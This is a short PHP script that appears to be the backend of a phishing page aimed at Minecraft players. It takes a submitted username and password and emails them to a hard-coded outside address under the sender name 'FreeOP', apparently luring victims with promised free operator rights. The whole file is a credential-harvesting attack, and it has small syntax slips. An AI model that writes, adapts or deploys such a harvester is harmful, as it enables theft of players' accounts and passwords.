<?php

$McE = $_POST["mce"];
$McPw = $_POST["mcpw"];

$to = 'mircohappyfeet@icloud.com';
$subject = 'Minecraft Username und Password!!!';
$message = 'Username: ' . $McE . '\nPw: ' . $McPw;
$from ="From: FreeOP"

mail($to, $subject, $message, $from)  

?>	
